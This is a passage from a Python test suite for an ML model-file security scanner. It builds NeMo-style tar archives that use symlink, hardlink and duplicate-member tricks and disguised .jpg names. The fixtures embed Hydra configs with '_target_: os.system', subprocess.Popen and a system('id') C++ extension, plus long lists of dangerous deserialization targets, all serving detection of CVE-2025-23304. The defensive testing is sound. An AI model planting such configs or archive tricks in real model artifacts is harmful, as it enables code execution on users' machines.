            writer_link.linkname = "alias/model_config.yaml"
            archive.addfile(writer_link)
            _add_tar_bytes(archive, "writer.bin", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            _add_tar_bytes(archive, "metadata.yaml", b"model: safe\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]

    def test_core_routes_colliding_hardlink_write_through_symlink_root_and_fails_closed(self, tmp_path: Path) -> None:
        path = tmp_path / "hardlink-fallback-symlink-root-config.jpg"
        with tarfile.open(path, "w") as archive:
            writer_link = tarfile.TarInfo("writer.yaml")
            writer_link.type = tarfile.SYMTYPE
            writer_link.linkname = "model_config.yaml"
            archive.addfile(writer_link)
            _add_tar_bytes(archive, "payload.bin", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            colliding_link = tarfile.TarInfo("writer.yaml")
            colliding_link.type = tarfile.LNKTYPE
            colliding_link.linkname = "payload.bin"
            archive.addfile(colliding_link)

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]

    def test_unrelated_safe_symlink_does_not_mark_regular_nemo_config_incomplete(self, tmp_path: Path) -> None:
        path = tmp_path / "unrelated-safe-link.nemo"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(archive, "assets/logo.bin", b"logo")
            latest_link = tarfile.TarInfo("assets/latest")
            latest_link.type = tarfile.SYMTYPE
            latest_link.linkname = "logo.bin"
            archive.addfile(latest_link)

        result = NemoScanner().scan(str(path))

        assert result.success is True
        assert "nemo_link_semantics_incomplete" not in result.metadata.get("scan_outcome_reasons", [])

    def test_unused_alias_to_regular_nemo_config_does_not_mark_scan_incomplete(self, tmp_path: Path) -> None:
        path = tmp_path / "unused-root-alias.nemo"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
            unused_link = tarfile.TarInfo("unused.yaml")
            unused_link.type = tarfile.SYMTYPE
            unused_link.linkname = "model_config.yaml"
            archive.addfile(unused_link)

        result = NemoScanner().scan(str(path))

        assert result.success is True
        assert "nemo_link_semantics_incomplete" not in result.metadata.get("scan_outcome_reasons", [])

    def test_unused_hardlink_alias_to_regular_nemo_config_does_not_mark_scan_incomplete(self, tmp_path: Path) -> None:
        path = tmp_path / "unused-root-hardlink-alias.nemo"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
            unused_link = tarfile.TarInfo("unused.bin")
            unused_link.type = tarfile.LNKTYPE
            unused_link.linkname = "model_config.yaml"
            archive.addfile(unused_link)

        result = NemoScanner().scan(str(path))

        assert result.success is True
        assert "nemo_link_semantics_incomplete" not in result.metadata.get("scan_outcome_reasons", [])

    def test_write_through_hardlink_alias_to_regular_nemo_config_fails_closed(self, tmp_path: Path) -> None:
        path = tmp_path / "written-root-hardlink-alias.nemo"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
            writer_link = tarfile.TarInfo("writer.bin")
            writer_link.type = tarfile.LNKTYPE
            writer_link.linkname = "model_config.yaml"
            archive.addfile(writer_link)
            _add_tar_bytes(archive, "writer.bin", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = NemoScanner().scan(str(path))

        assert result.success is False
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]

    def test_fallback_symlink_detaches_loaded_alias_without_marking_incomplete(self, tmp_path: Path) -> None:
        path = tmp_path / "detached-root-symlink-alias.nemo"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
            writer_link = tarfile.TarInfo("writer.yaml")
            writer_link.type = tarfile.SYMTYPE
            writer_link.linkname = "model_config.yaml"
            archive.addfile(writer_link)
            _add_tar_bytes(archive, "safe.txt", b"safe")
            safe_link = tarfile.TarInfo("safe_alias")
            safe_link.type = tarfile.SYMTYPE
            safe_link.linkname = "safe.txt"
            archive.addfile(safe_link)
            colliding_link = tarfile.TarInfo("writer.yaml")
            colliding_link.type = tarfile.LNKTYPE
            colliding_link.linkname = "safe_alias"
            archive.addfile(colliding_link)

        result = NemoScanner().scan(str(path))

        assert result.success is True
        assert "nemo_link_semantics_incomplete" not in result.metadata.get("scan_outcome_reasons", [])

    def test_declared_nemo_link_resolution_budget_exhaustion_fails_closed(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        path = tmp_path / "link-resolution-budget.nemo"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "payload.txt"
            archive.addfile(root_link)

        monkeypatch.setattr("modelaudit.scanners.nemo_scanner.NEMO_MAX_LINK_RESOLUTION_MEMBER_VISITS", 1)
        result = NemoScanner().scan(str(path))

        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_link_resolution_budget_exceeded" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "NeMo Link Resolution" and "member-visit safety limit" in check.message
            for check in result.checks
        )

        cache_dir = tmp_path / "cache"
        reset_cache_manager()
        try:
            aggregate = scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            metadata = aggregate.file_metadata[str(path)]

            assert aggregate.success is False
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert "nemo_link_resolution_budget_exceeded" in metadata["scan_outcome_reasons"]
            assert determine_exit_code(aggregate) == 2
            assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
        finally:
            reset_cache_manager()

    def test_declared_nemo_symlink_chain_hops_consume_link_resolution_budget(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        path = tmp_path / "symlink-resolution-budget.nemo"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "payload.txt"
            archive.addfile(root_link)
            first_alias = tarfile.TarInfo("alias-1.txt")
            first_alias.type = tarfile.SYMTYPE
            first_alias.linkname = "model_config.yaml"
            archive.addfile(first_alias)
            second_alias = tarfile.TarInfo("alias-2.txt")
            second_alias.type = tarfile.SYMTYPE
            second_alias.linkname = "alias-1.txt"
            archive.addfile(second_alias)
            _add_tar_bytes(archive, "alias-2.txt", b"model: safe\n")

        monkeypatch.setattr("modelaudit.scanners.nemo_scanner.NEMO_MAX_LINK_RESOLUTION_MEMBER_VISITS", 8)
        result = NemoScanner().scan(str(path))

        assert result.success is False
        assert "nemo_link_resolution_budget_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_declared_nemo_prepass_symlink_hops_consume_link_resolution_budget(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        path = tmp_path / "prepass-symlink-resolution-budget.nemo"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
            first_alias = tarfile.TarInfo("alias-1")
            first_alias.type = tarfile.SYMTYPE
            first_alias.linkname = "."
            archive.addfile(first_alias)
            second_alias = tarfile.TarInfo("alias-2")
            second_alias.type = tarfile.SYMTYPE
            second_alias.linkname = "alias-1"
            archive.addfile(second_alias)
            _add_tar_bytes(archive, "alias-2/payload.bin", b"safe\n")

        monkeypatch.setattr("modelaudit.scanners.nemo_scanner.NEMO_MAX_LINK_RESOLUTION_MEMBER_VISITS", 1)
        result = NemoScanner().scan(str(path))

        assert result.success is False
        assert "nemo_link_resolution_budget_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_declared_nemo_component_prefix_probes_consume_link_resolution_budget(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        path = tmp_path / "component-prefix-resolution-budget.nemo"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
            alias = tarfile.TarInfo("alias")
            alias.type = tarfile.SYMTYPE
            alias.linkname = "."
            archive.addfile(alias)
            _add_tar_bytes(archive, "one/two/three/four/payload.bin", b"safe\n")

        monkeypatch.setattr("modelaudit.scanners.nemo_scanner.NEMO_MAX_LINK_RESOLUTION_MEMBER_VISITS", 3)
        result = NemoScanner().scan(str(path))

        assert result.success is False
        assert "nemo_link_resolution_budget_exceeded" in result.metadata["scan_outcome_reasons"]

    def test_declared_nemo_mixed_link_mutation_fails_closed(self, tmp_path: Path) -> None:
        path = tmp_path / "mixed-link-mutation.nemo"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.SYMTYPE
            root_link.linkname = "payload.txt"
            archive.addfile(root_link)
            _add_tar_bytes(archive, "unrelated.txt", b"safe\n")
            unrelated_link = tarfile.TarInfo("alias.txt")
            unrelated_link.type = tarfile.LNKTYPE
            unrelated_link.linkname = "unrelated.txt"
            archive.addfile(unrelated_link)

        result = NemoScanner().scan(str(path))

        assert result.success is False
        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "NeMo Link Resolution" and "mixed link mutation" in check.message for check in result.checks
        )

    @pytest.mark.parametrize(
        ("config_name", "payload_name"),
        [("model_config.yaml", "payload.txt"), ("configs/../model_config.yaml", "configs/../payload.txt")],
    )
    def test_core_scans_duplicate_linked_root_config_replacement(
        self,
        tmp_path: Path,
        config_name: str,
        payload_name: str,
    ) -> None:
        path = tmp_path / "duplicate-linked-config.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, payload_name, b"model: safe\n")
            _add_tar_bytes(archive, payload_name, b"model:\n  _target_: os.system\n  command: echo pwned\n")
            link_info = tarfile.TarInfo(config_name)
            link_info.type = tarfile.SYMTYPE
            link_info.linkname = "payload.txt"
            archive.addfile(link_info)

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_scans_duplicate_root_config_replacement(self, tmp_path: Path) -> None:
        path = tmp_path / "duplicate-root-config.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_renamed_nemo_root_config_within_route_budget_is_scanned(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "_NEMO_ROUTE_MAX_ENTRIES", 3)
        path = tmp_path / "late-config.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "assets/one.bin", b"one")
            _add_tar_bytes(archive, "assets/two.bin", b"two")
            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_renamed_nemo_safe_symlink_root_routes_before_late_target(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "_NEMO_ROUTE_MAX_ENTRIES", 2)
        path = tmp_path / "late-linked-config.jpg"
        with tarfile.open(path, "w") as archive:
            link_info = tarfile.TarInfo("model_config.yaml")
            link_info.type = tarfile.SYMTYPE
            link_info.linkname = "payload.txt"
            archive.addfile(link_info)
            _add_tar_bytes(archive, "assets/filler.bin", b"x")
            _add_tar_bytes(archive, "payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = scan_file(str(path), config={"cache_scan_results": False, "max_tar_entries": 100})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]
        assert any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)

    def test_renamed_tar_over_route_budget_fails_closed_without_nemo_promotion(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "_NEMO_ROUTE_MAX_ENTRIES", 2)
        path = tmp_path / "large-generic.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "assets/one.bin", b"one")
            _add_tar_bytes(archive, "assets/two.bin", b"two")
            _add_tar_bytes(archive, "deployment.yaml", b"model:\n  _target_: os.system\n")

        result = scan_file(str(path), config={"cache_scan_results": False, "max_tar_entries": 100})

        assert result.scanner_name == "unknown"
        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_routing_incomplete" in result.metadata["scan_outcome_reasons"]
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)

    def test_nested_compressed_nemo_over_route_budget_fails_closed(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "_NEMO_ROUTE_MAX_ENTRIES", 2)
        nested_path = tmp_path / "payload.tar.gz"
        with tarfile.open(nested_path, "w:gz") as archive:
            _add_tar_bytes(archive, "assets/one.bin", b"one")
            _add_tar_bytes(archive, "assets/two.bin", b"two")
            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n")
        outer_path = tmp_path / "outer.tar"
        with tarfile.open(outer_path, "w") as archive:
            archive.add(nested_path, arcname="models/payload.tar.gz")

        result = scan_file(str(outer_path), config={"cache_scan_results": False, "max_tar_entries": 100})

        assert result.scanner_name == "tar"
        assert result.success is False
        assert any(
            check.name == "NeMo Routing"
            and check.status == CheckStatus.FAILED
            and "models/payload.tar.gz" in str(check.location)
            for check in result.checks
        )
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)

    def test_referenced_compressed_nemo_over_route_budget_fails_closed(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "_NEMO_ROUTE_MAX_ENTRIES", 2)
        nested_path = tmp_path / "referenced-payload.tar.gz"
        with tarfile.open(nested_path, "w:gz") as archive:
            _add_tar_bytes(archive, "assets/one.bin", b"one")
            _add_tar_bytes(archive, "assets/two.bin", b"two")
            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n")
        path = tmp_path / "referenced-container.jpg"
        config = {"model": {"_target_": "nemo.Model"}, "artifact": "nemo:assets/payload.tar.gz"}
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "model_config.yaml", yaml.safe_dump(config).encode())
            archive.add(nested_path, arcname="assets/payload.tar.gz")

        result = scan_file(str(path), config={"cache_scan_results": False, "max_tar_entries": 100})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_routing_incomplete" in result.metadata["scan_outcome_reasons"]
        assert result.has_errors is False
        assert result.metadata["operational_error"] is True
        assert result.metadata["operational_error_reason"] == "nemo_routing_incomplete"
        assert any(
            check.name == "NeMo Routing"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.INFO
            and "assets/payload.tar.gz" in str(check.location)
            for check in result.checks
        )
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)

        aggregate = scan_model_directory_or_file(
            str(path),
            config={"cache_scan_results": False, "max_tar_entries": 100},
        )
        assert aggregate.has_errors is False
        assert determine_exit_code(aggregate) == 2

    def test_referenced_incomplete_nemo_route_preserves_security_exit_code(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "_NEMO_ROUTE_MAX_ENTRIES", 2)
        nested_path = tmp_path / "referenced-payload.tar.gz"
        with tarfile.open(nested_path, "w:gz") as archive:
            _add_tar_bytes(archive, "assets/one.bin", b"one")
            _add_tar_bytes(archive, "assets/two.bin", b"two")
            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n")
        path = tmp_path / "referenced-malicious-container.jpg"
        config = {"model": {"_target_": "os.system"}, "artifact": "nemo:assets/payload.tar.gz"}
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "model_config.yaml", yaml.safe_dump(config).encode())
            archive.add(nested_path, arcname="assets/payload.tar.gz")

        result = scan_model_directory_or_file(
            str(path),
            config={"cache_scan_results": False, "max_tar_entries": 100},
        )

        assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
        assert result.has_errors is False
        assert determine_exit_code(result) == 1

    def test_nested_incomplete_nemo_route_does_not_promote_unrelated_info_checks(self, tmp_path: Path) -> None:
        extracted_path = str(tmp_path / "nested-payload.tar.gz")
        result = ScanResult(scanner_name="nemo")
        nested_result = ScanResult(scanner_name="nemo")
        nested_result.metadata["scan_outcome"] = INCONCLUSIVE_SCAN_OUTCOME
        nested_result.metadata["scan_outcome_reasons"] = ["nemo_routing_incomplete"]
        nested_result.metadata["operational_error"] = True
        nested_result.metadata["operational_error_reason"] = "nemo_routing_incomplete"
        nested_result.add_check(
            name="NeMo Routing",
            passed=False,
            message="Bounded route incomplete",
            severity=IssueSeverity.INFO,
            location=extracted_path,
            details={"format": file_detection.NEMO_ROUTING_INCONCLUSIVE_FORMAT},
        )
        nested_result.add_check(
            name="Hydra _target_ Review",
            passed=False,
            message="Review target",
            severity=IssueSeverity.INFO,
            location=extracted_path,
            details={"target": "skops.io.load"},
        )
        assert len(nested_result.issues) == 2

        NemoScanner._merge_nested_security_findings(
            result,
            nested_result,
            extracted_path,
            str(tmp_path / "outer.nemo"),
            "assets/payload.tar.gz",
        )

        assert result.checks == []
        assert result.issues == []
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_routing_incomplete" in result.metadata["scan_outcome_reasons"]
        assert "operational_error" not in result.metadata

    @pytest.mark.parametrize(
        ("reason", "check_name"),
        [
            ("llamafile_routing_incomplete", "Llamafile Routing"),
            ("recognized_format_scanner_unavailable", "Format Detection"),
            ("xml_model_routing_incomplete", "XML Model Routing"),
        ],
    )
    def test_nested_coverage_only_incomplete_outcomes_without_findings_are_propagated(
        self,
        tmp_path: Path,
        reason: str,
        check_name: str,
    ) -> None:
        extracted_path = str(tmp_path / "nested-payload.bin")
        result = ScanResult(scanner_name="nemo")
        nested_result = ScanResult(scanner_name="unknown")
        nested_result.metadata["scan_outcome"] = INCONCLUSIVE_SCAN_OUTCOME
        nested_result.metadata["scan_outcome_reasons"] = [reason]
        nested_result.metadata["operational_error"] = True
        nested_result.metadata["operational_error_reason"] = reason
        nested_result.add_check(
            name=check_name,
            passed=False,
            message="Nested operational scan incomplete",
            severity=IssueSeverity.INFO,
            location=extracted_path,
        )

        NemoScanner._merge_nested_security_findings(
            result,
            nested_result,
            extracted_path,
            str(tmp_path / "outer.nemo"),
            "assets/payload.bin",
        )

        assert result.checks == []
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert reason in result.metadata["scan_outcome_reasons"]
        assert "operational_error" not in result.metadata

    def test_nested_structural_reject_without_findings_is_not_propagated(self, tmp_path: Path) -> None:
        extracted_path = str(tmp_path / "tokenizer.model")
        result = ScanResult(scanner_name="nemo")
        nested_result = ScanResult(scanner_name="xgboost")
        nested_result.metadata["scan_outcome"] = INCONCLUSIVE_SCAN_OUTCOME
        nested_result.metadata["scan_outcome_reasons"] = ["xgboost_binary_structure_too_small"]
        nested_result.add_check(
            name="XGBoost Binary Structure",
            passed=False,
            message="XGBoost binary payload is too small to validate",
            severity=IssueSeverity.INFO,
            location=extracted_path,
        )

        NemoScanner._merge_nested_security_findings(
            result,
            nested_result,
            extracted_path,
            str(tmp_path / "outer.nemo"),
            "artifacts/tokenizer.model",
        )

        assert result.checks == []
        assert result.issues == []
        assert "scan_outcome" not in result.metadata
        assert "operational_error" not in result.metadata

    def test_referenced_joblib_operational_failure_is_not_hidden_by_nemo_composition(self, tmp_path: Path) -> None:
        path = tmp_path / "referenced-joblib-container.jpg"
        config = {"model": {"_target_": "nemo.Model"}, "artifact": "nemo:assets/payload.joblib"}
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "model_config.yaml", yaml.safe_dump(config).encode())
            _add_tar_bytes(archive, "assets/payload.joblib", b"not a pickle")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "joblib_wrapper_decode_failed" in result.metadata["scan_outcome_reasons"]
        assert result.metadata["operational_error_reason"] == "joblib_wrapper_decode_failed"
        assert any(
            check.name == "Compression Bomb Detection"
            and check.status == CheckStatus.FAILED
            and "assets/payload.joblib" in str(check.location)
            for check in result.checks
        )

    def test_declared_nemo_scans_root_config_beyond_renamed_route_budget(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "_NEMO_ROUTE_MAX_ENTRIES", 2)
        path = tmp_path / "declared.nemo"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "assets/one.bin", b"one")
            _add_tar_bytes(archive, "assets/two.bin", b"two")
            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_nested_renamed_nemo_member_detects_dangerous_target(self, tmp_path: Path) -> None:
        member_path = _create_nemo_file(
            tmp_path,
            {"model": {"_target_": "os.system", "command": "echo pwned"}},
            filename="model.jpg",
        )
        archive_path = tmp_path / "bundle.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.write(member_path, arcname="models/model.jpg")

        result = scan_file(str(archive_path), config={"cache_scan_results": False})

        assert result.scanner_name == "zip"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    @pytest.mark.parametrize("config_name", ["docs/model_config.yaml", "/model_config.yaml"])
    def test_renamed_non_root_config_tar_is_not_promoted_to_nemo(self, tmp_path: Path, config_name: str) -> None:
        path = _create_nemo_file(
            tmp_path,
            {"model": {"_target_": "os.system", "command": "echo pwned"}},
            filename="generic.jpg",
            config_name=config_name,
        )

        assert not NemoScanner.can_handle(str(path))

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "tar"
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)

    def test_nested_renamed_nested_config_basename_tar_is_not_promoted_to_nemo(self, tmp_path: Path) -> None:
        member_path = _create_nemo_file(
            tmp_path,
            {"model": {"_target_": "os.system", "command": "echo pwned"}},
            filename="generic.jpg",
            config_name="docs/model_config.yaml",
        )
        archive_path = tmp_path / "bundle.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.write(member_path, arcname="models/generic.jpg")

        result = scan_file(str(archive_path), config={"cache_scan_results": False})

        assert result.scanner_name == "zip"
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)

    def test_dangerous_subprocess_detected(self, tmp_path):
        """subprocess.Popen _target_ should trigger CVE-2025-23304."""
        config = {"trainer": {"callbacks": [{"_target_": "subprocess.Popen", "args": ["whoami"]}]}}
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        cve_checks = [c for c in result.checks if "CVE-2025-23304" in c.name]
        assert len(cve_checks) > 0, "Should detect subprocess.Popen"
        assert cve_checks[0].details.get("target") == "subprocess.Popen"

    @pytest.mark.parametrize(
        "target",
        [
            "cloudpickle.load",
            "cloudpickle.loads",
            "dill.load",
            "dill.loads",
            "torch.load",
            "torch.jit.load",
            "torch.hub.load",
            "torch.hub.load_state_dict_from_url",
            "torch.package.PackageImporter",
            "torch.package.PackageImporter.load_pickle",
            "torch.serialization.load",
            "torch.utils.model_zoo.load_url",
            "joblib.load",
            "sklearn.externals.joblib.load",
            "keras.models.load_model",
            "tensorflow.keras.models.load_model",
            "tensorflow.saved_model.load",
            "tf.keras.models.load_model",
            "mlflow.pyfunc.load_model",
            "pandas.read_pickle",
        ],
    )
    def test_ml_deserialization_targets_detected_as_dangerous(self, tmp_path: Path, target: str) -> None:
        """Hydra targets that deserialize model artifacts should not fall through to INFO review."""
        config = {"model": {"_target_": target, "f": "weights.bin"}}
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        cve_checks = [c for c in result.checks if c.name == "CVE-2025-23304: Dangerous Hydra _target_"]
        assert len(cve_checks) == 1
        assert cve_checks[0].status == CheckStatus.FAILED
        assert cve_checks[0].severity == IssueSeverity.CRITICAL
        assert cve_checks[0].details["target"] == target

    @pytest.mark.parametrize(
        "target",
        [
            "torch.utils.cpp_extension.load",
            "torch.utils.cpp_extension.load_inline",
            "torch.utils.cpp_extension._jit_compile",
        ],
    )
    def test_torch_cpp_extension_targets_detected_as_dangerous(self, tmp_path: Path, target: str) -> None:
        """Native extension JIT/load helpers must not be hidden by torch.utils allowlisting."""
        config = {
            "model": {
                "_target_": target,
                "name": "malicious_extension",
                "cpp_sources": ['#include <cstdlib>\nint run() { return system("id"); }'],
            },
        }
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        cve_checks = [
            check
            for check in result.checks
            if check.name == "CVE-2025-23304: Dangerous Hydra _target_" and check.details.get("target") == target
        ]
        assert len(cve_checks) == 1
        assert cve_checks[0].status == CheckStatus.FAILED
        assert cve_checks[0].severity == IssueSeverity.CRITICAL
        assert cve_checks[0].details["cve_id"] == "CVE-2025-23304"

    @pytest.mark.parametrize(
        "target",
        [
            "torch.utils.data.DataLoader",
            "torch.utils.data.dataloader.DataLoader",
            "torch.utils.data.sampler.RandomSampler",
        ],
    )
    def test_explicit_safe_torch_utils_data_target_remains_safe(self, tmp_path: Path, target: str) -> None:
        """Legitimate torch.utils data helpers stay clean without trusting all torch.utils targets."""
        config = {"loader": {"_target_": target, "batch_size": 4}}
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        assert not [
            check
            for check in result.checks
            if check.name == "CVE-2025-23304: Dangerous Hydra _target_" and check.details.get("target") == target
        ]
        assert any(
            check.name == "Hydra _target_ Safety Check"
            and check.status == CheckStatus.PASSED
            and check.details.get("target") == target
            for check in result.checks
        )

    @pytest.mark.parametrize(
        "target",
        [
            "numpy.fromfile",
            "numpy.fromregex",
            "numpy.genfromtxt",
            "numpy.lib._datasource.DataSource._cache",
            "numpy.lib._datasource.DataSource._findfile",
            "numpy.lib._datasource.DataSource.exists",
            "numpy.lib._datasource.DataSource.open",
            "numpy.lib._datasource.open",
            "numpy.lib._format_impl.open_memmap",
            "numpy.lib._npyio_impl.fromregex",
            "numpy.lib._npyio_impl.genfromtxt",
            "numpy.lib._npyio_impl.load",
            "numpy.lib._npyio_impl.loadtxt",
            "numpy.lib._npyio_impl.NpzFile",
            "numpy.lib._npyio_impl.save",
            "numpy.lib._npyio_impl.savez",
            "numpy.lib._npyio_impl.savez_compressed",
            "numpy.lib._npyio_impl.savetxt",
            "numpy.lib.format.open_memmap",
            "numpy.lib.npyio.DataSource._cache",
            "numpy.lib.npyio.DataSource._findfile",
            "numpy.lib.npyio.DataSource.exists",
            "numpy.lib.npyio.DataSource.open",
            "numpy.lib.npyio.fromregex",
            "numpy.lib.npyio.genfromtxt",
            "numpy.lib.npyio.load",
            "numpy.lib.npyio.loadtxt",
            "numpy.lib.npyio.NpzFile",
            "numpy.lib.npyio.recfromcsv",
            "numpy.lib.npyio.recfromtxt",
            "numpy.lib.npyio.save",
            "numpy.lib.npyio.savez",
            "numpy.lib.npyio.savez_compressed",
            "numpy.lib.npyio.savetxt",
            "numpy.load",
            "numpy.loadtxt",
            "numpy.memmap",
            "numpy._core.memmap.memmap",
            "numpy._core.multiarray.fromfile",
            "numpy._core.records.fromfile",
            "numpy.core.memmap.memmap",
            "numpy.core.multiarray.fromfile",
            "numpy.core.records.fromfile",
            "numpy.ndarray.dump",
            "numpy.ndarray.tofile",
            "numpy.rec.fromfile",
            "numpy.recfromcsv",
            "numpy.recfromtxt",
            "numpy.save",
            "numpy.savez",
            "numpy.savez_compressed",
            "numpy.savetxt",
        ],
    )
    def test_numpy_file_io_targets_override_safe_namespace(self, tmp_path: Path, target: str) -> None:
        """NumPy file I/O callables must not be hidden by the trusted numpy namespace."""
